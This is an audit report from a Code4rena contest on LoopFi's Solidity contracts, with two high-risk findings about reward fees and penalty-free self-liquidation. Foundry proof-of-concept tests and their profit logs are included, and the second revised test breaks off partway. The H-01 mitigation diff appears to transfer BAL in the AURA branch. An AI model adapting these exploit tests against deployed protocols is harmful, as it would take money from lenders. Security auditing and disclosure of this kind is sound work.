---
sponsor: "LoopFi"
slug: "2024-07-loopfi"
date: "2025-02-17"
title: "LoopFi"
findings: "https://github.com/code-423n4/2024-07-loopfi-findings/issues"
contest: 415
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the LoopFi smart contract system written in Solidity. The audit took place between July 25 — August 15, 2024.

## Wardens

94 Wardens contributed reports to LoopFi:

  1. [pkqs90](https://code4rena.com/@pkqs90)
  2. [novamanbg](https://code4rena.com/@novamanbg)
  3. [Evo](https://code4rena.com/@Evo)
  4. [Bauchibred](https://code4rena.com/@Bauchibred)
  5. [hash](https://code4rena.com/@hash)
  6. [0xAlix2](https://code4rena.com/@0xAlix2) ([a\_kalout](https://code4rena.com/@a_kalout) and [ali\_shehab](https://code4rena.com/@ali_shehab))
  7. [rscodes](https://code4rena.com/@rscodes)
  8. [lian886](https://code4rena.com/@lian886)
  9. [nnez](https://code4rena.com/@nnez)
  10. [0xpiken](https://code4rena.com/@0xpiken)
  11. [Rhaydden](https://code4rena.com/@Rhaydden)
  12. [crypticdefense](https://code4rena.com/@crypticdefense)
  13. [Agontuk](https://code4rena.com/@Agontuk)
  14. [hearmen](https://code4rena.com/@hearmen)
  15. [0x40saoirse](https://code4rena.com/@0x40saoirse)
  16. [Kaysoft](https://code4rena.com/@Kaysoft)
  17. [0xbepresent](https://code4rena.com/@0xbepresent)
  18. [mrMorningstar](https://code4rena.com/@mrMorningstar)
  19. [Spearmint](https://code4rena.com/@Spearmint)
  20. [Centaur](https://code4rena.com/@Centaur) ([Mylifechangefast\_eth](https://code4rena.com/@Mylifechangefast_eth), [Aristos](https://code4rena.com/@Aristos) and [TheWeb3Mechanic](https://code4rena.com/@TheWeb3Mechanic))
  21. [Afriauditor](https://code4rena.com/@Afriauditor)
  22. [monrel](https://code4rena.com/@monrel)
  23. [zhaojohnson](https://code4rena.com/@zhaojohnson)
  24. [0xc0ffEE](https://code4rena.com/@0xc0ffEE)
  25. [lanrebayode77](https://code4rena.com/@lanrebayode77)
  26. [NexusAudits](https://code4rena.com/@NexusAudits) ([cheatc0d3](https://code4rena.com/@cheatc0d3) and [Zanna](https://code4rena.com/@Zanna))
  27. [minglei-wang-3570](https://code4rena.com/@minglei-wang-3570)
  28. [4B](https://code4rena.com/@4B)
  29. [Bigsam](https://code4rena.com/@Bigsam)
  30. [Chinmay](https://code4rena.com/@Chinmay)
  31. [chaduke](https://code4rena.com/@chaduke)
  32. [0xhacksmithh](https://code4rena.com/@0xhacksmithh)
  33. [Sparrow](https://code4rena.com/@Sparrow)
  34. [zzebra83](https://code4rena.com/@zzebra83)
  35. [lightoasis](https://code4rena.com/@lightoasis)
  36. [jigster](https://code4rena.com/@jigster)
  37. [AKA8u9K111er](https://code4rena.com/@AKA8u9K111er)
  38. [Infect3d](https://code4rena.com/@Infect3d)
  39. [karsar](https://code4rena.com/@karsar)
  40. [0xBugSlayer](https://code4rena.com/@0xBugSlayer)
  41. [zhaojie](https://code4rena.com/@zhaojie)
  42. [inh3l](https://code4rena.com/@inh3l)
  43. [EPSec](https://code4rena.com/@EPSec) ([petarP1998](https://code4rena.com/@petarP1998) and [1337web3](https://code4rena.com/@1337web3))
  44. [seaona](https://code4rena.com/@seaona)
  45. [VAD37](https://code4rena.com/@VAD37)
  46. [Trooper](https://code4rena.com/@Trooper)
  47. [web3km](https://code4rena.com/@web3km)
  48. [joaovwfreire](https://code4rena.com/@joaovwfreire)
  49. [Nyx](https://code4rena.com/@Nyx)
  50. [0xINFINITY](https://code4rena.com/@0xINFINITY)
  51. [grearlake](https://code4rena.com/@grearlake)
  52. [Ruhum](https://code4rena.com/@Ruhum)
  53. [boraichodrunkenmaster](https://code4rena.com/@boraichodrunkenmaster)
  54. [pks\_](https://code4rena.com/@pks_)
  55. [emerald7017](https://code4rena.com/@emerald7017)
  56. [thisvishalsingh](https://code4rena.com/@thisvishalsingh)
  57. [petarP1998](https://code4rena.com/@petarP1998)
  58. [Anirruth](https://code4rena.com/@Anirruth)
  59. [13u9](https://code4rena.com/@13u9)
  60. [gumgumzum](https://code4rena.com/@gumgumzum)
  61. [peanuts](https://code4rena.com/@peanuts)
  62. [yashar](https://code4rena.com/@yashar)
  63. [josephxander](https://code4rena.com/@josephxander)
  64. [ElCid](https://code4rena.com/@ElCid)
  65. [Inspecktor](https://code4rena.com/@Inspecktor)
  66. [ak1](https://code4rena.com/@ak1)
  67. [zxriptor](https://code4rena.com/@zxriptor)
  68. [JanuaryPersimmon2024](https://code4rena.com/@JanuaryPersimmon2024)
  69. [ustas](https://code4rena.com/@ustas)
  70. [emmac002](https://code4rena.com/@emmac002)
  71. [0xAadi](https://code4rena.com/@0xAadi)
  72. [asui](https://code4rena.com/@asui)
  73. [Eeyore](https://code4rena.com/@Eeyore)
  74. [0xMax1mus](https://code4rena.com/@0xMax1mus)
  75. [Walter](https://code4rena.com/@Walter)
  76. [Breeje](https://code4rena.com/@Breeje)
  77. [unRekt](https://code4rena.com/@unRekt) ([tdey](https://code4rena.com/@tdey) and [Gululu](https://code4rena.com/@Gululu))
  78. [atoko](https://code4rena.com/@atoko)
  79. [0xjoaovpsantos](https://code4rena.com/@0xjoaovpsantos)
  80. [jolah1](https://code4rena.com/@jolah1)
  81. [Sungyu](https://code4rena.com/@Sungyu)
  82. [y0ng0p3](https://code4rena.com/@y0ng0p3)
  83. [0xspryon](https://code4rena.com/@0xspryon)
  84. [0XRolko](https://code4rena.com/@0XRolko)
  85. [Damola0x](https://code4rena.com/@Damola0x)
  86. [BiasedMerc](https://code4rena.com/@BiasedMerc)
  87. [K42](https://code4rena.com/@K42)
  88. [jo13](https://code4rena.com/@jo13)

This audit was judged by [Koolex](https://code4rena.com/@koolex).

Final report assembled by [thebrittfactor](https://twitter.com/brittfactorC4).

# Summary

The C4 analysis yielded an aggregated total of 54 unique vulnerabilities. Of these vulnerabilities, 15 received a risk rating in the category of HIGH severity and 39 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 23 reports detailing issues with a risk rating of LOW severity or non-critical.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 LoopFi repository](https://github.com/code-423n4/2024-07-loopfi), and is composed of 26 smart contracts written in the Solidity programming language and includes 4562 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (15)
## [[H-01] `AuraVault::claim` reward calculation does not deduct fees from reward amount, causing DoS or extra rewards lost](https://github.com/code-423n4/2024-07-loopfi-findings/issues/401)
*Submitted by [crypticdefense](https://github.com/code-423n4/2024-07-loopfi-findings/issues/401), also found by [Agontuk](https://github.com/code-423n4/2024-07-loopfi-findings/issues/578) and [mrMorningstar](https://github.com/code-423n4/2024-07-loopfi-findings/issues/206)*

`AuraVault::claim` allows users to claim rewards corresponding to the amount of `WETH` they are depositing in the same call.

Prior to sending rewards to `msg.sender`, a percentage of the rewards is sent to the `vault locker rewards`. However, the percentage of the rewards sent to the `vault locker rewards` is not deducted from the amount that is sent to the caller. The entire `reward amount` is sent to `msg.sender`.

This is problematic, as it creates two possible scenarios:

1. Contract attempts to send more reward tokens than it holds, causing DoS.
2. Contract successfully sends extra reward tokens, essentially stealing rewards from others.

Therefore, the impact ranges from `stolen funds` to `Denial of Service`.

### Proof of Concept

As users interact with the `AuraVault` contract, the contract will accumulate rewards through interaction with an external [rewards contract](https://etherscan.io/address/0x2a14db8d09db0542f6a371c0cb308a768227d67d#code), which acts as an ERC-4626 vault.

Users can deposit, withdraw, redeem, and *claim* rewards:

[AuraVault.sol#L275-L310](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/vendor/AuraVault.sol#L275-L310)

```javascript
    /**
     * @notice Allows anyone to claim accumulated rewards by depositing WETH instead
     * @param amounts An array of reward amounts to be claimed ordered as [rewardToken, secondaryRewardToken]
     * @param maxAmountIn The max amount of WETH to be sent to the Vault
     */
    function claim(uint256[] memory amounts, uint256 maxAmountIn) external returns (uint256 amountIn) {
        // Claim rewards from Aura reward pool
        IPool(rewardPool).getReward();

        // Compute assets amount to be sent to the Vault
        VaultConfig memory _config = vaultConfig;
        amountIn = _previewReward(amounts[0], amounts[1], _config);

        // Transfer assets to Vault
        require(amountIn <= maxAmountIn, "!Slippage");
        IERC20(asset()).safeTransferFrom(msg.sender, address(this), amountIn);

        // Compound assets into "asset" balance
        IERC20(asset()).safeApprove(rewardPool, amountIn);
        IPool(rewardPool).deposit(amountIn, address(this));

        // Distribute BAL rewards
@>      IERC20(BAL).safeTransfer(_config.lockerRewards, (amounts[0] * _config.lockerIncentive) / INCENTIVE_BASIS);
@>      IERC20(BAL).safeTransfer(msg.sender, amounts[0]);

        // Distribute AURA rewards
        if (block.timestamp <= INFLATION_PROTECTION_TIME) {
@>          IERC20(AURA).safeTransfer(_config.lockerRewards, (amounts[1] * _config.lockerIncentive) / INCENTIVE_BASIS);
@>          IERC20(AURA).safeTransfer(msg.sender, amounts[1]);
        } else {
            // after INFLATION_PROTECTION_TIME
            IERC20(AURA).safeTransfer(_config.lockerRewards, IERC20(AURA).balanceOf(address(this)));
        }

        emit Claimed(msg.sender, amounts[0], amounts[1], amountIn);
    }
```

Firstly, rewards are claimed from the `Aura reward pool`, proceeded by a call to `_previewReward()` to calculate the amount of `WETH` the caller must deposit to receive the amount of rewards they have specified.

The issue is with the transferring of rewards. We can see the `vault locker rewards` receives a percentage of the rewards, calculated by `(amounts[0] * _config.lockerIncentive) / INCENTIVE_BASIS)`.

However, the entire amount of rewards is still sent to the caller, without accounting for the percentage that was just sent to the `vault locker rewards`. Therefore, this call is sending extra rewards to the caller.

As mentioned, this leads to two scenarios:

1. DoS due to insufficient rewards.
2. Extra rewards successfully sent to the caller, essentially stealing rewards from others.

Consider the following scenario:

1. Alice decides to deposit `WETH` and claim `BAL` and `AURA` rewards via a call to `AuraVault::claim`. `_config.lockerIncentive` is set to 1000 and `INCENTIVE_BASIS` is set to 10000, effectively setting the fee portion to 10%.
2. Alice sets `amounts[0] = 100e18 BAL` and `amount[1] = 100e18 AURA`.
3. `IPool(rewardPool).getReward();` is called, setting the rewards held in the `AuraVault` contract to `100e18 BAL` and `100e18 AURA`.
4. `IERC20(BAL).safeTransfer(_config.lockerRewards, (amounts[0] * _config.lockerIncentive) / INCENTIVE_BASIS);` call sends `100e18 * 1000 / 10000 = 10e18` `BAL` tokens to `_config.lockerRewards`, which is the `vault locker rewards`.
5. The `AuraVault` contract now holds `90e18 BAL` and `100e18 AURA`.
6. `IERC20(BAL).safeTransfer(msg.sender, amounts[0]);` attempts to send `100e18 BAL` to `msg.sender`; however, `10e18` was already sent to `locker rewards`, so this call will DoS due to insufficient funds.

The call will revert in the case described above, and Alice would have to specify a lower amount of rewards (i.e., 50e18 BAL and AURA), but we can see that the contract will still send more rewards than intended, effectively stealing rewards from others.

### Tools Used

Foundry

### Recommended Mitigation Steps

Ensure the amount sent to the locker is deducted from the amount sent to the caller:

```diff
    /**
     * @notice Allows anyone to claim accumulated rewards by depositing WETH instead
     * @param amounts An array of reward amounts to be claimed ordered as [rewardToken, secondaryRewardToken]
     * @param maxAmountIn The max amount of WETH to be sent to the Vault
     */
    function claim(uint256[] memory amounts, uint256 maxAmountIn) external returns (uint256 amountIn) {
        // Claim rewards from Aura reward pool
        IPool(rewardPool).getReward();

        // Compute assets amount to be sent to the Vault
        VaultConfig memory _config = vaultConfig;
        amountIn = _previewReward(amounts[0], amounts[1], _config);

        // Transfer assets to Vault
        require(amountIn <= maxAmountIn, "!Slippage");
        IERC20(asset()).safeTransferFrom(msg.sender, address(this), amountIn);

        // Compound assets into "asset" balance
        IERC20(asset()).safeApprove(rewardPool, amountIn);
        IPool(rewardPool).deposit(amountIn, address(this));

        // Distribute BAL rewards
+       uint256 fee = (amounts[0] * _config.lockerIncentive) / INCENTIVE_BASIS;
+       uint256 amount = amounts[0] - fee;
-       IERC20(BAL).safeTransfer(_config.lockerRewards, (amounts[0] * _config.lockerIncentive) / INCENTIVE_BASIS);
-       IERC20(BAL).safeTransfer(msg.sender, amounts[0]);
+       IERC20(BAL).safeTransfer(_config.lockerRewards, fee);
+       IERC20(BAL).safeTransfer(msg.sender, amount);

        // Distribute AURA rewards
        if (block.timestamp <= INFLATION_PROTECTION_TIME) {
+           fee = (amounts[1] * _config.lockerIncentive) / INCENTIVE_BASIS;
+           amount = amounts[1] - fee;
-           IERC20(AURA).safeTransfer(_config.lockerRewards, (amounts[1] * _config.lockerIncentive) / INCENTIVE_BASIS);
-           IERC20(AURA).safeTransfer(msg.sender, amounts[1]);
+           IERC20(BAL).safeTransfer(_config.lockerRewards, fee);
+           IERC20(BAL).safeTransfer(msg.sender, amount);
        } else {
            // after INFLATION_PROTECTION_TIME
            IERC20(AURA).safeTransfer(_config.lockerRewards, IERC20(AURA).balanceOf(address(this)));
        }

        emit Claimed(msg.sender, amounts[0], amounts[1], amountIn);
    }
```

### Assessed type

Error

**[amarcu (LoopFi) acknowledged and commented via duplicate issue #206](https://github.com/code-423n4/2024-07-loopfi-findings/issues/206#issuecomment-2363352472):**
> Acknowledged but we will remove and not use the `AuraVault`.

***

## [[H-02] Liquidation doesn't account for penalty when calculating collateral to give, allowing users to profit by borrowing and self-liquidating](https://github.com/code-423n4/2024-07-loopfi-findings/issues/399)
*Submitted by [crypticdefense](https://github.com/code-423n4/2024-07-loopfi-findings/issues/399), also found by [0xhacksmithh](https://github.com/code-423n4/2024-07-loopfi-findings/issues/581), [mrMorningstar](https://github.com/code-423n4/2024-07-loopfi-findings/issues/447), [Bigsam](https://github.com/code-423n4/2024-07-loopfi-findings/issues/436), [Chinmay](https://github.com/code-423n4/2024-07-loopfi-findings/issues/271), and [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/58)*

`CDPVault` allows users to borrow `underlying` from `PoolV3` by depositing collateral into the vault, such that the `(collateral value of their position / liquidationRatio) >= their current total debt`.

Users must repay their debt fully via `CDPVault::repay`, and the amount must cover their entire `current total debt`, which also includes various interest factors. If the value of their collateral divided by `liquidationRatio` is less than the debt of their position, then their position is considered `unsafe` and anyone can `liquidate` the position by buying the collateral at a `discount`. The amount spent by the caller is used to cover for the debt.

To ensure that users cannot profit from self liquidations, the `liquidatePosition` function incorporates a penalty mechanism, that is intended to deduct fees from the payment amount, which subsequently goes to the protocol as profit.

The problem is that when the `liquidatePosition` function calculates the collateral to give to the caller, it utilizes the the repay amount *without* the penalty, essentially functioning as if there is no penalty mechanism at all. The caller can specify any `repay amount`, and the collateral they receive will correspond directly to `repay amount / discount`, with no penalty.

This allows malicious users to profit by `deposit collateral -> borrow WETH -> have their position become unsafe -> buy collateral with WETH at a discount`. Malicious users can profit and steal funds from lenders and the protocol.

> The natspec for the `CDPVault::liquidatePosition` states that "From that repay amount a penalty (`liquidationPenalty`) is subtracted to mitigate against profitable self liquidations." 

However, we will see in the PoC how this has no impact against profitable self liquidations

### Proof of Concept

The following block is executed when users repay their debt:

[CDPVault.sol#L402-L426](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L402-L426)

```javascript
    } else if (deltaDebt < 0) {
@>      uint256 maxRepayment = calcTotalDebt(debtData);
        uint256 amount = abs(deltaDebt);
        if (amount >= maxRepayment) {
            amount = maxRepayment; // U:[CM-11]
            deltaDebt = -toInt256(maxRepayment);
        }

        poolUnderlying.safeTransferFrom(creditor, address(pool), amount);

        uint128 newCumulativeQuotaInterest;
        if (amount == maxRepayment) {
            newDebt = 0;
            newCumulativeIndex = debtData.cumulativeIndexNow;
            profit = debtData.accruedInterest;
            newCumulativeQuotaInterest = 0;
        } else {
            (newDebt, newCumulativeIndex, profit, newCumulativeQuotaInterest) = calcDecrease(
                amount, // delta debt
                position.debt,
                debtData.cumulativeIndexNow, // current cumulative base interest index in Ray
                position.cumulativeIndexLastUpdate,
                debtData.cumulativeQuotaInterest
            );
        }
```

For users to completely repay their loan, they must pay `maxRepayment` amount, which is calculated via a call to `calcTotalDebt`.

If the position is unsafe (`collateral value / liquidation ratio < total debt`), then anyone can liquidate it for a discount:

[CDPVault.sol#L521-L532](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L521-L532)

```javascript
        // load price and calculate discounted price
        uint256 spotPrice_ = spotPrice();
@>      uint256 discountedPrice = wmul(spotPrice_, liqConfig_.liquidationDiscount);
        if (spotPrice_ == 0) revert CDPVault__liquidatePosition_invalidSpotPrice();
        // Ensure that there's no bad debt
        if (calcTotalDebt(debtData) > wmul(position.collateral, spotPrice_)) revert CDPVault__BadDebt();

        // compute collateral to take, debt to repay and penalty to pay
@>      uint256 takeCollateral = wdiv(repayAmount, discountedPrice);
        uint256 deltaDebt = wmul(repayAmount, liqConfig_.liquidationPenalty);
        uint256 penalty = wmul(repayAmount, WAD - liqConfig_.liquidationPenalty);
```

There is also a penalty that the liquidator must pay (deducted from `repayAmount`). This is to mitigate profits from self-liquidation, as stated by the natspec of this function:

[CDPVault.sol#L503-L504](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L503-L504)

```javascript
    /// ... From that repay amount a penalty (`liquidationPenalty`) is subtracted to mitigate against
    /// profitable self liquidations ...
```

So the actual amount of debt repaid by the liquidator is `repayAmount - penalty`:

[CDPVault.sol#L538-L539](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L538-L539)

```javascript
    // transfer the repay amount from the liquidator to the vault
    poolUnderlying.safeTransferFrom(msg.sender, address(pool), repayAmount - penalty);
```

In the same call, the `penalty` is also transferred to the pool, taken as a profit for the protocol.

[CDPVault.sol#L567-L569](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L567-L569)

```javascript
     // Mint the penalty from the vault to the treasury
        poolUnderlying.safeTransferFrom(msg.sender, address(pool), penalty);
        IPoolV3Loop(address(pool)).mintProfit(penalty);
```

However, there is a critical problem here. We can see that the intention here is that the caller pays `repayAmount - penalty` for the debt, and that the penalty goes towards profit.

This can be confirmed by observing the amount of debt that is covered via repayment:

[CDPVault.sol#L530](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L530)

```javascript
     uint256 deltaDebt = wmul(repayAmount, liqConfig_.liquidationPenalty);
```

Note that `repayAmount * liqConfig_.liquidationPenalty` is equivalent to `repayAmount - penalty`. So the debt reduced is `repayAmount - penalty`. The problem is that the *collateral sent to the caller does not incorporate the penalty for liquidation*.

Essentially, this makes the `penalty` redundant, because the caller still receives the full `repayAmount` of collateral specified, including a `discount`.

A malicious user can perform the following attack scenario:

1. Deposit collateral via `CDPVault::deposit`.
2. Borrow WETH via `CDPVault::borrow`.
3. Have their position become unsafe (i.e., wait until enough debt interest is accrued such that `(collateral value of their position / liquidationRatio) < their current total debt`).
4. Fully buy back collateral at a discount.

### Coded PoC

Note: The value of the discount and penalty were chosen by observing the values currently set in `scripts/config.js`, they were not chosen arbitrarily.

Add the following to `test/unit/CDPVault.t.sol` and run `forge test --mt testSelfLiquidateProfit -vv`:

```javascript
    function testSelfLiquidateProfit() public {
        mockWETH.mint(address(this), 20e18);

        // discount = 0.98 ether (0.02% discount)
        // penalty = 0.99 ether (0.01% penalty)
        CDPVault vault = createCDPVault(token, 150 ether, 0, 1.25 ether, 0.99 ether, 0.98 ether);
        createGaugeAndSetGauge(address(vault));

        // create position
        uint256 wethBefore = mockWETH.balanceOf(address(this));
        _modifyCollateralAndDebt(vault, 100 ether, 80 ether);
        uint256 wethBorrowed = mockWETH.balanceOf(address(this)) - wethBefore;
        uint256 collateralDeposited = 100 ether;
        console.log("weth borrowed: ", wethBorrowed);
        console.log("collateral deposited: ", collateralDeposited);
        
        address position = address(this);
        uint256 amountUserMustRepay = vault.virtualDebt(position);
        console.log("Amount of debt user must repay: ", amountUserMustRepay);

        // any attempt to liquidate now will revert because position is safe
        vm.expectRevert(bytes4(keccak256("CDPVault__liquidatePosition_notUnsafe()")));
        vault.liquidatePosition(position, 1 ether);

        // user waits some time for price to change so position becomes unsafe (but no bad debt yet)
        // in reality, interest will accrue, however to make this PoC simple we will update spot price (which is another way user can take advantage)
        _updateSpot(0.80 ether);
        (uint256 collateral, uint256 debt , , , , ) = vault.positions(position);

        // calculate amount to repay to fully liquidate position.
        uint256 spotAmt = oracle.spot(address(token));
        uint256 discountPercent = 0.98 ether;
        uint256 discountAmount = wmul(spotAmt, discountPercent);
        uint256 repayFull = wmul(collateral, discountAmount);
        console.log("Amount user is repaying: ", repayFull);
        mockWETH.approve(address(vault), repayFull);

        // fully liquidate position
        wethBefore = mockWETH.balanceOf(address(this));
        uint collateralBefore = token.balanceOf(address(this));
        vault.liquidatePosition(position, repayFull);
        uint256 wethSpent = wethBefore - mockWETH.balanceOf(address(this));
        uint256 collateralReceived = token.balanceOf(address(this)) - collateralBefore;
        console.log("weth spent: ", wethSpent);
        console.log("collateral received: ", collateralReceived);
        
        console.log("Total WETH earned: ", wethBorrowed - wethSpent);
        console.log("collateral lost: ", collateralDeposited -  collateralReceived);

        // confirm that collateral in position is 0
        (collateral, debt, , , , ) = vault.positions(position);
        console.log("collateral remaining in position: ", collateral);
    }
```

```text
[PASS] testSelfLiquidateProfit() (gas: 3761322)
Logs:
  weth borrowed:  80000000000000000000
  collateral deposited:  100000000000000000000
  Amount of debt user must repay:  80000000000000000000
  Amount user is repaying:  78400000000000000000
  weth spent:  78400000000000000000
  collateral received:  100000000000000000000
  Total WETH earned:  1600000000000000000
  collateral lost:  0
  collateral remaining in position:  0

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.46ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

As displayed in the coded PoC, since the user receives the full amount of collateral without the penalty applied to the amount they receive, the user profits 1.6e18 WETH with the attack scenario described above.

### Tools Used

Foundry

### Recommended Mitigation Steps

Apply the penalty to `repayAmount` when calculating the amount of collateral to give to the caller. In addition, ensure that the protocol applies a high enough penalty such that self-liquidators cannot profit from this attack.

<details>

```diff
    function liquidatePosition(address owner, uint256 repayAmount) external whenNotPaused {
        // validate params
        if (owner == address(0) || repayAmount == 0) revert CDPVault__liquidatePosition_invalidParameters();

        // load configs
        VaultConfig memory config = vaultConfig;
        LiquidationConfig memory liqConfig_ = liquidationConfig;

        // load liquidated position
        Position memory position = positions[owner];
        DebtData memory debtData = _calcDebt(position);

        // load price and calculate discounted price
        uint256 spotPrice_ = spotPrice();
        uint256 discountedPrice = wmul(spotPrice_, liqConfig_.liquidationDiscount);
        if (spotPrice_ == 0) revert CDPVault__liquidatePosition_invalidSpotPrice();
        // Ensure that there's no bad debt
        if (calcTotalDebt(debtData) > wmul(position.collateral, spotPrice_)) revert CDPVault__BadDebt();

        // compute collateral to take, debt to repay and penalty to pay
-       uint256 takeCollateral = wdiv(repayAmount, discountedPrice);
        uint256 deltaDebt = wmul(repayAmount, liqConfig_.liquidationPenalty);
        uint256 penalty = wmul(repayAmount, WAD - liqConfig_.liquidationPenalty);
+       uint256 takeCollateral = wdiv(repayAmount - penalty, discountedPrice);
        if (takeCollateral > position.collateral) revert CDPVault__tooHighRepayAmount();

        // verify that the position is indeed unsafe
        if (_isCollateralized(calcTotalDebt(debtData), wmul(position.collateral, spotPrice_), config.liquidationRatio))
            revert CDPVault__liquidatePosition_notUnsafe();

        // transfer the repay amount from the liquidator to the vault
        poolUnderlying.safeTransferFrom(msg.sender, address(pool), repayAmount - penalty);

        uint256 newDebt;
        uint256 profit;
        uint256 maxRepayment = calcTotalDebt(debtData);
        uint256 newCumulativeIndex;
        if (deltaDebt == maxRepayment) {
            newDebt = 0;
            newCumulativeIndex = debtData.cumulativeIndexNow;
            profit = debtData.accruedInterest;
            position.cumulativeQuotaInterest = 0;
        } else {
            (newDebt, newCumulativeIndex, profit, position.cumulativeQuotaInterest) = calcDecrease(
                deltaDebt, // delta debt
                debtData.debt,
                debtData.cumulativeIndexNow, // current cumulative base interest index in Ray
                debtData.cumulativeIndexLastUpdate,
                debtData.cumulativeQuotaInterest
            );
        }
        position.cumulativeQuotaIndexLU = debtData.cumulativeQuotaIndexNow;
        // update liquidated position
        position = _modifyPosition(owner, position, newDebt, newCumulativeIndex, -toInt256(takeCollateral), totalDebt);

        pool.repayCreditAccount(debtData.debt - newDebt, profit, 0); // U:[CM-11]
        // transfer the collateral amount from the vault to the liquidator
        token.safeTransfer(msg.sender, takeCollateral);

        // Mint the penalty from the vault to the treasury
        poolUnderlying.safeTransferFrom(msg.sender, address(pool), penalty);
        IPoolV3Loop(address(pool)).mintProfit(penalty);

        if (debtData.debt - newDebt != 0) {
            IPoolV3(pool).updateQuotaRevenue(_calcQuotaRevenueChange(-int(debtData.debt - newDebt))); // U:[PQK-15]
        }
    }
```

</details>

### Assessed type

Error

**[0xtj24 (LoopFi) disputed via duplicate issue #58](https://github.com/code-423n4/2024-07-loopfi-findings/issues/58#issuecomment-2340487020):** 
> The penalty is taken from the liquidator [here](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L568).

**[crypticdefense (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/399#issuecomment-2392514889):**
 > @Koolex - This finding is how liquidators must pay `repayAmount` to the protocol with a `penalty` to prevent profitable self-liquidations. `repayAmount - penalty` is used to cover the debt payment, and `penalty` is given to the protocol for profit. Since `repayAmount-penalty` is used to cover the debt, the caller should only get `repayAmount-penalty` worth of collateral. However, the caller receives the full `repayAmount` value of collateral *including* the penalty, as if the penalty added towards the debt. This defeats the purpose of the penalty and allows a critical vulnerability where an attacker can borrow and self liquidate at a discount, thus stealing funds from lenders/protocol, as described in the coded PoC.

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/399#issuecomment-2408915338):**
 > @crypticdefense - Could you please adjust the PoC to show the same impact when interested accrued? 
> 
> Ref:
> ```solidity
>         // user waits some time for price to change so position becomes unsafe (but no bad debt yet)
>         // in reality, interest will accrue, however to make this PoC simple we will update spot price (which is another way user can take advantage)
> ```
>
> This will help to assess the severity. 

**[crypticdefense (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/399#issuecomment-2409820202):**
 > @Koolex, here is the adjusted PoC that shows the same impact when interest is accrued.
> 
> Add the following to `test/unit/CDPVault.t.sol` and run forge `test --mt testSelfLiquidateProfit -vv`:
> 
><details>
>
> ```javascript
>     function testSelfLiquidateProfit() public {
>         mockWETH.mint(address(this), 20e18);
> 
>         // discount = 0.92 ether (8% discount)
>         // penalty = 0.99 ether (0.01% penalty)
>         // liquidation ratio = 1.05 ether (105%)
>         CDPVault vault = createCDPVault(token, 150 ether, 0, 1.05 ether, 0.99 ether, 0.92 ether);
>         createGaugeAndSetGauge(address(vault));
> 
>         // create position
>         uint256 wethBefore = mockWETH.balanceOf(address(this));
>         _modifyCollateralAndDebt(vault, 100 ether, 95 ether);
>         uint256 wethBorrowed = mockWETH.balanceOf(address(this)) - wethBefore;
>         uint256 collateralDeposited = 100 ether;
>         console.log("weth borrowed: ", wethBorrowed);
>         console.log("collateral deposited: ", collateralDeposited);
>         
>         address position = address(this);
>         uint256 amountUserMustRepay = vault.virtualDebt(position);
>         console.log("Amount of debt user must repay: ", amountUserMustRepay);
> 
>         // any attempt to liquidate now will revert because position is safe
>         vm.expectRevert(bytes4(keccak256("CDPVault__liquidatePosition_notUnsafe()")));
>         vault.liquidatePosition(position, 1 ether);
> 
>         // 30 days have now passed, with interest accrued
>         vm.warp(block.timestamp + 30 days);
> 
>         // new amount user must repay due to debt accrued
>         amountUserMustRepay = vault.virtualDebt(position);
>         console.log("Amount of debt user must repay after 30 days of interest accrued: ", amountUserMustRepay);
> 
>         (uint256 collateral, uint256 debt , , , , ) = vault.positions(position);
>         
>         // calculate amount to repay to fully liquidate position.
>         uint256 collateralSpotPrice = oracle.spot(address(token));
>         uint256 discountPercent = 0.92 ether;
>         uint256 discountAmount = wmul(collateralSpotPrice, discountPercent);
>         uint256 repayFull = wmul(collateral, discountAmount);
>         console.log("Amount user is repaying: ", repayFull);
>         mockWETH.approve(address(vault), repayFull); 
> 
>         // fully liquidate position
>         wethBefore = mockWETH.balanceOf(address(this));
>         uint collateralBefore = token.balanceOf(address(this));
>         vault.liquidatePosition(position, uint256(repayFull));
>         
>         uint256 wethSpent = wethBefore - mockWETH.balanceOf(address(this));
>         uint256 collateralReceived = token.balanceOf(address(this)) - collateralBefore;
>         console.log("weth spent: ", wethSpent);
>         console.log("collateral received: ", collateralReceived);
>         
>         console.log("Total WETH earned: ", wethBorrowed - wethSpent);
>         console.log("collateral lost: ", collateralDeposited -  collateralReceived);
> 
>         // confirm that collateral in position is 0
>         (collateral, debt, , , , ) = vault.positions(position);
>         console.log("collateral remaining in position: ", collateral);
>     }
> ```
> 
> ```text
> Ran 1 test for src/test/unit/CDPVault.t.sol:CDPVaultTest
> [PASS] testSelfLiquidateProfit() (gas: 3775443)
> Logs:
>   weth borrowed:  95000000000000000000
>   collateral deposited:  100000000000000000000
>   Amount of debt user must repay:  95000000000000000000
>   Amount of debt user must repay after 30 days of interest accrued:  95788804673650282029
>   Amount user is repaying:  92000000000000000000
